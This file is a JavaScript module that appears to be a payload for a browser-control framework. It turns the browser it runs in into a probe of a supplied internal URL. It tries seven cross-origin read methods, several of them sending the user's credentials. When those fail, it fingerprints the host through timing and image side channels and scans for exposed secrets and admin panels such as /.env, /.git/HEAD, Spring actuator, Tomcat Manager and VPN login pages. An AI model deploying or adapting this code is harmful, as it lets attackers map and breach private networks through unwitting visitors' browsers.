// Param: full URL to fetch (e.g. http://192.168.1.1:8080/path/page.css)
// Returns body (text or base64 for binary), content-type, status, headers
// Tries 7 strategies before giving up. On total failure returns rich metadata.
var raw = '{{param}}';
if(!raw){ __pzResult({error:'No URL specified'}); return '__async__'; }
var url = /^https?:\/\//.test(raw) ? raw : 'http://' + raw;

(async function(){
  function abToB64(buf){
    var bytes=new Uint8Array(buf),bin='';
    for(var i=0;i<bytes.length;i++) bin+=String.fromCharCode(bytes[i]);
    return btoa(bin);
  }
  function isText(ct){
    if(!ct) return true; ct=ct.toLowerCase();
    return /^text\/|json|xml|javascript|svg|css|html/.test(ct);
  }
  function hdrsObj(r){var h={};r.headers.forEach(function(v,k){h[k]=v;});return h;}
  async function readResp(r,method){
    var h=hdrsObj(r),ct=h['content-type']||'';
    if(isText(ct)) return {ok:true,body:await r.text(),encoding:'text',content_type:ct,headers:h,status:r.status,final_url:r.url||'',method:method};
    return {ok:true,body:abToB64(await r.arrayBuffer()),encoding:'base64',content_type:ct,headers:h,status:r.status,final_url:r.url||'',method:method};
  }

  // ── Strategy 1: Standard CORS fetch ──
  function s1(){return fetch(url,{mode:'cors',credentials:'omit',cache:'no-store',redirect:'follow'}).then(function(r){return readResp(r,'cors');});}

  // ── Strategy 2: CORS with credentials (misconfigured servers may allow) ──
  function s2(){return fetch(url,{mode:'cors',credentials:'include',cache:'no-store',redirect:'follow'}).then(function(r){return readResp(r,'cors-cred');});}

  // ── Strategy 3: XHR (some servers treat differently than fetch) ──
  function s3(){
    return new Promise(function(ok,fail){
      var x=new XMLHttpRequest();x.open('GET',url,true);x.timeout=15000;
      var ext=(url.split('?')[0].split('.').pop()||'').toLowerCase();
      if({'png':1,'jpg':1,'jpeg':1,'gif':1,'ico':1,'webp':1,'woff':1,'woff2':1,'ttf':1,'eot':1,'mp4':1,'webm':1,'pdf':1,'zip':1,'gz':1}[ext]) x.responseType='arraybuffer';
      x.onload=function(){
        var ct=x.getResponseHeader('content-type')||'';
        if(x.responseType==='arraybuffer') ok({ok:true,body:abToB64(x.response),encoding:'base64',content_type:ct,status:x.status,method:'xhr'});
        else ok({ok:true,body:x.responseText,encoding:'text',content_type:ct,status:x.status,method:'xhr'});
      };
      x.onerror=function(){fail(new Error('XHR error'));};
      x.ontimeout=function(){fail(new Error('XHR timeout'));};
      x.send();
    });
  }

  // ── Strategy 4: XHR with credentials ──
  function s4(){
    return new Promise(function(ok,fail){
      var x=new XMLHttpRequest();x.open('GET',url,true);x.withCredentials=true;x.timeout=15000;
      x.onload=function(){
        var ct=x.getResponseHeader('content-type')||'';
        ok({ok:true,body:x.responseText,encoding:'text',content_type:ct,status:x.status,method:'xhr-cred'});
      };
      x.onerror=function(){fail(new Error('XHR-cred error'));};
      x.ontimeout=function(){fail(new Error('XHR-cred timeout'));};
      x.send();
    });
  }

  // ── Strategy 5: Default fetch (no explicit mode — browser decides) ──
  function s5(){return fetch(url,{cache:'no-store',redirect:'follow'}).then(function(r){return readResp(r,'default');});}

  // ── Strategy 6: EventSource (works cross-origin if server streams SSE!) ──
  function s6(){
    return new Promise(function(ok,fail){
      var done=false,data='',t=setTimeout(function(){if(!done){done=true;es.close();if(data)ok({ok:true,body:data,encoding:'text',content_type:'text/event-stream',status:200,method:'eventsource'});else fail(new Error('SSE no data'));}},5000);
      var es;try{es=new EventSource(url);}catch(e){clearTimeout(t);fail(e);return;}
      es.onmessage=function(e){data+=e.data+'\n';};
      es.onerror=function(){if(!done){done=true;clearTimeout(t);es.close();if(data)ok({ok:true,body:data,encoding:'text',content_type:'text/event-stream',status:200,method:'eventsource'});else fail(new Error('SSE error'));}};
    });
  }

  // ── Strategy 7: WebSocket (for ws:// endpoints) ──
  function s7(){
    return new Promise(function(ok,fail){
      var done=false,msgs=[],wsUrl=url.replace(/^http/,'ws');
      var t=setTimeout(function(){if(!done){done=true;try{ws.close();}catch(e){}if(msgs.length)ok({ok:true,body:msgs.join('\n'),encoding:'text',content_type:'text/plain',method:'websocket'});else fail(new Error('WS timeout'));}},5000);
      var ws;try{ws=new WebSocket(wsUrl);}catch(e){clearTimeout(t);fail(e);return;}
      ws.onmessage=function(e){msgs.push(typeof e.data==='string'?e.data:'[binary frame]');};
      ws.onerror=function(){if(!done){done=true;clearTimeout(t);fail(new Error('WS error'));}};
      ws.onclose=function(e){if(!done){done=true;clearTimeout(t);if(msgs.length)ok({ok:true,body:msgs.join('\n'),encoding:'text',content_type:'text/plain',method:'websocket'});else fail(new Error('WS closed:'+e.code));}};
      ws.onopen=function(){ws.send('');};
    });
  }

  // ── Metadata fallback — extract EVERYTHING we can without CORS ──
  async function collectMetadata(){
    var meta={ok:false,cors_blocked:true,target_url:url,metadata:{}};
    var baseUrl=url.replace(/\/[^/]*$/,'')||url;

    // 1. Reachability (no-cors .then() = opaque 200 = host is UP)
    try{await fetch(url,{mode:'no-cors',cache:'no-store'});meta.metadata.reachable=true;}catch(e){meta.metadata.reachable=false;}

    // 2. Timing + response size via PerformanceResourceTiming
    try{
      performance.clearResourceTimings();
      await fetch(url+'?_t='+Date.now(),{mode:'no-cors',cache:'no-store'}).catch(function(){});
      await new Promise(function(r){setTimeout(r,1500);});
      var entries=performance.getEntriesByType('resource').filter(function(e){return e.name.indexOf(url)===0;});
      if(entries.length){
        var e=entries[entries.length-1];
        meta.metadata.timing={
          duration_ms:Math.round(e.duration),
          ttfb_ms:e.responseStart>0?Math.round(e.responseStart-e.requestStart):null,
          transfer_bytes:e.transferSize||0,
          body_bytes:e.encodedBodySize||0,
          decoded_bytes:e.decodedBodySize||0
        };
        var sz=e.transferSize||e.encodedBodySize||0;
        if(sz>0&&sz<200) meta.metadata.size_hint='Tiny response (~'+sz+'B) — redirect, empty page, or API stub';
        else if(sz<2000) meta.metadata.size_hint='Small (~'+sz+'B) — login form, simple page, or API response';
        else if(sz<20000) meta.metadata.size_hint='Medium (~'+sz+'B) — typical web page or dashboard';
        else if(sz>0) meta.metadata.size_hint='Large (~'+sz+'B) — full web app, framework, or file server';
      }
    }catch(e){}

    // 3. OPTIONS preflight (may leak Server, Allow, X-Powered-By headers)
    try{
      var r=await fetch(url,{method:'OPTIONS',mode:'cors',credentials:'omit',cache:'no-store'});
      var h={};r.headers.forEach(function(v,k){h[k]=v;});
      meta.metadata.options={status:r.status,headers:h};
      if(h.server) meta.metadata.server=h.server;
      if(h.allow) meta.metadata.http_methods=h.allow;
      if(h['x-powered-by']) meta.metadata.powered_by=h['x-powered-by'];
    }catch(e){}

    // 4. Favicon probe (browsers load images cross-origin freely)
    var favPaths=['/favicon.ico','/favicon.png','/apple-touch-icon.png','/apple-touch-icon-precomposed.png','/favicon-32x32.png','/favicon-16x16.png'];
    var favBase=url.replace(/(:\/\/[^/]+).*$/,'$1');
    try{
      var favResults=await Promise.all(favPaths.map(function(p){
        return new Promise(function(resolve){
          var img=new Image(),done=false;
          var t=setTimeout(function(){if(!done){done=true;img.src='';resolve(null);}},3000);
          img.onload=function(){if(!done){done=true;clearTimeout(t);resolve({path:p,width:img.naturalWidth,height:img.naturalHeight});}};
          img.onerror=function(){if(!done){done=true;clearTimeout(t);resolve(null);}};
          img.src=favBase+p+'?_='+Date.now();
        });
      }));
      var found=favResults.filter(function(f){return f;});
      if(found.length) meta.metadata.favicons=found;
    }catch(e){}

    // 5. WebSocket fingerprint (connection behavior reveals service type)
    try{
      var wsInfo=await new Promise(function(resolve){
        var wsUrl=url.replace(/^http/,'ws'),done=false,t0=performance.now();
        var t=setTimeout(function(){if(!done){done=true;try{ws.close();}catch(e){}resolve({timeout:true,time_ms:Math.round(performance.now()-t0)});}},3000);
        var ws;try{ws=new WebSocket(wsUrl);}catch(e){clearTimeout(t);resolve({error:e.message});return;}
        ws.onopen=function(){if(!done){done=true;clearTimeout(t);ws.close();resolve({accepts_ws:true,time_ms:Math.round(performance.now()-t0)});}};
        ws.onerror=function(){};
        ws.onclose=function(e){if(!done){done=true;clearTimeout(t);resolve({accepts_ws:false,close_code:e.code,close_reason:e.reason||'',time_ms:Math.round(performance.now()-t0)});}};
      });
      meta.metadata.websocket=wsInfo;
    }catch(e){}

    // 6. Path probing using PerformanceResourceTiming size comparison
    // no-cors fetch .then() fires for ALL paths (200 AND 404 both return opaque).
    // To distinguish real resources from error pages, measure 404 baseline size
    // then compare each probe's size against it.
    var probes=[
      {p:'/robots.txt',h:'Has robots.txt'},{p:'/.well-known/security.txt',h:'Has security.txt'},
      {p:'/sitemap.xml',h:'Has sitemap'},
      {p:'/wp-login.php',h:'WordPress'},{p:'/wp-includes/js/jquery/jquery.min.js',h:'WordPress'},
      {p:'/wp-json/wp/v2/posts',h:'WordPress REST API'},{p:'/wp-content/',h:'WordPress content'},
      {p:'/administrator/',h:'Joomla'},{p:'/misc/drupal.js',h:'Drupal'},
      {p:'/user/login',h:'Drupal login'},{p:'/typo3/',h:'TYPO3 CMS'},
      {p:'/api/',h:'API endpoint'},{p:'/graphql',h:'GraphQL API'},
      {p:'/swagger-ui/',h:'Swagger/OpenAPI docs'},
      {p:'/.env',h:'⚠ .env exposed!'},{p:'/.git/HEAD',h:'⚠ .git exposed!'},
      {p:'/.svn/entries',h:'⚠ .svn exposed!'},
      {p:'/phpmyadmin/',h:'phpMyAdmin'},{p:'/adminer.php',h:'Adminer DB tool'},
      {p:'/login',h:'Login page'},{p:'/admin',h:'Admin panel'},{p:'/dashboard',h:'Dashboard'},
      {p:'/jenkins/',h:'Jenkins CI'},{p:'/gitlab/',h:'GitLab'},{p:'/portainer/',h:'Portainer'},
      {p:'/manager/html',h:'Tomcat Manager'},{p:'/console',h:'Console endpoint'},
      {p:'/remote/login',h:'FortiGate VPN'},
      {p:'/global-protect/',h:'Palo Alto GlobalProtect'},
      {p:'/v1/sys/health',h:'HashiCorp Vault'},{p:'/actuator',h:'Spring Boot Actuator'},
      {p:'/actuator/env',h:'⚠ Spring env exposed!'},
      {p:'/phpinfo.php',h:'⚠ phpinfo() exposed!'},
    ];
    try{
      // Step 1: Measure 404 baseline size
      var nonce404='_pz404_'+Date.now()+'_'+Math.random().toString(36).slice(2,8);
      performance.clearResourceTimings();
      await fetch(favBase+'/'+nonce404,{mode:'no-cors',cache:'no-store'}).catch(function(){});
      await new Promise(function(r){setTimeout(r,1200);});
      var baselineSize=-1;
      var baseEntries=performance.getEntriesByType('resource');
      for(var i=baseEntries.length-1;i>=0;i--){
        if(baseEntries[i].name.indexOf(nonce404)!==-1){
          baselineSize=baseEntries[i].transferSize||baseEntries[i].encodedBodySize||0;
          break;
        }
      }
      meta.metadata.baseline_404_size=baselineSize;

      if(baselineSize>0){
        // Step 2: Fire all probes with unique nonces for performance tracking
        performance.clearResourceTimings();
        var probeData=probes.map(function(pr,idx){return {probe:pr,nonce:'_pzlp'+idx+'_'+Date.now()};});
        await Promise.all(probeData.map(function(pd){
          return fetch(favBase+pd.probe.p+(pd.probe.p.indexOf('?')!==-1?'&':'?')+pd.nonce+'=1',{mode:'no-cors',cache:'no-store'}).catch(function(){});
        }));
        await new Promise(function(r){setTimeout(r,2000);});

        // Step 3: Compare sizes to 404 baseline
        var allEntries=performance.getEntriesByType('resource');
        var found=[];
        probeData.forEach(function(pd){
          for(var i=allEntries.length-1;i>=0;i--){
            if(allEntries[i].name.indexOf(pd.nonce)!==-1){
              var sz=allEntries[i].transferSize||allEntries[i].encodedBodySize||0;
              if(sz>0&&Math.abs(sz-baselineSize)>50){
                found.push({path:pd.probe.p,hint:pd.probe.h,size:sz});
              }
              break;
            }
          }
        });

        if(found.length){
          meta.metadata.detected_paths=found.map(function(r){return {path:r.path,hint:r.hint,size:r.size};});
          var hints=found.map(function(r){return r.hint;}).join(' ');
          if(/WordPress/i.test(hints)) meta.metadata.inferred_type='WordPress CMS';
          else if(/Joomla/i.test(hints)) meta.metadata.inferred_type='Joomla CMS';
          else if(/Drupal/i.test(hints)) meta.metadata.inferred_type='Drupal CMS';
          else if(/phpMyAdmin|Adminer/i.test(hints)) meta.metadata.inferred_type='Database Admin Tool';
          else if(/GraphQL/i.test(hints)) meta.metadata.inferred_type='GraphQL API Server';
          else if(/Swagger|OpenAPI/i.test(hints)) meta.metadata.inferred_type='API Server';
          else if(/Jenkins/i.test(hints)) meta.metadata.inferred_type='Jenkins CI/CD';
          else if(/GitLab/i.test(hints)) meta.metadata.inferred_type='GitLab';
          else if(/Portainer/i.test(hints)) meta.metadata.inferred_type='Portainer (Docker)';
          else if(/Vault/i.test(hints)) meta.metadata.inferred_type='HashiCorp Vault';
          else if(/FortiGate|GlobalProtect/i.test(hints)) meta.metadata.inferred_type='VPN Gateway';
          else if(/Tomcat/i.test(hints)) meta.metadata.inferred_type='Apache Tomcat';
          else if(/Spring|Actuator/i.test(hints)) meta.metadata.inferred_type='Spring Boot App';
          if(found.some(function(r){return r.path==='/.env';})) meta.metadata.exposure_env=true;
          if(found.some(function(r){return r.path==='/.git/HEAD';})) meta.metadata.exposure_git=true;
          if(found.some(function(r){return r.path==='/.svn/entries';})) meta.metadata.exposure_svn=true;
        }
      }else{
        meta.metadata.path_probe_note='Browser does not expose transfer sizes (Firefox without Timing-Allow-Origin) — cannot distinguish real paths from 404s';
      }

      // Error page info from the baseline measurement
      if(baselineSize>0){
        meta.metadata.error_page_size=baselineSize;
        if(baselineSize<=250) meta.metadata.error_hint='Small error page — likely nginx or minimal server';
        else if(baselineSize<=500) meta.metadata.error_hint='Medium error page — Apache, IIS, or embedded device';
        else if(baselineSize>500) meta.metadata.error_hint='Large error page — framework with custom error handling';
      }
    }catch(e){}

    // 8. <script> probe — if root serves JS, may reveal framework
    try{
      var scriptInfo=await new Promise(function(resolve){
        var s=document.createElement('script'),done=false;
        var t=setTimeout(function(){if(!done){done=true;s.remove();resolve(null);}},3000);
        s.onerror=function(){if(!done){done=true;clearTimeout(t);s.remove();resolve({loaded:false});}};
        s.onload=function(){if(!done){done=true;clearTimeout(t);s.remove();resolve({loaded:true,hint:'Root serves valid JavaScript'});}};
        s.src=favBase+'/?_s='+Date.now();
        (document.head||document.documentElement).appendChild(s);
      });
      if(scriptInfo) meta.metadata.script_probe=scriptInfo;
    }catch(e){}

    // 9. CSS link probe — browsers can sometimes read cross-origin stylesheets via CSSOM
    try{
      var cssInfo=await new Promise(function(resolve){
        var link=document.createElement('link');link.rel='stylesheet';
        var done=false;
        var t=setTimeout(function(){if(!done){done=true;link.remove();resolve(null);}},3000);
        link.onload=function(){
          if(!done){done=true;clearTimeout(t);
            var rules=null;
            try{rules=link.sheet?link.sheet.cssRules.length:0;}catch(e){}
            link.remove();
            resolve({loaded:true,rules_readable:rules!==null,rule_count:rules});
          }
        };
        link.onerror=function(){if(!done){done=true;clearTimeout(t);link.remove();resolve(null);}};
        link.href=favBase+'/style.css?_='+Date.now();
        (document.head||document.documentElement).appendChild(link);
      });
      if(cssInfo) meta.metadata.css_probe=cssInfo;
    }catch(e){}

    meta.error='CORS blocked — all '+strategies.length+' strategies failed. Rich metadata collected instead.';
    return meta;
  }

  // ── Execute strategies in order ──
  var strategies=[s1,s2,s3,s4,s5,s6,s7];
  var errors=[];

  for(var i=0;i<strategies.length;i++){
    try{
      var r=await strategies[i]();
      if(r&&r.ok){__pzResult(r);return;}
    }catch(e){errors.push((i+1)+': '+e.message);}
  }

  // All strategies failed — collect rich metadata
  var meta=await collectMetadata();
  meta.strategies_tried=strategies.length;
  meta.strategy_errors=errors;
  __pzResult(meta);
})();

return '__async__';
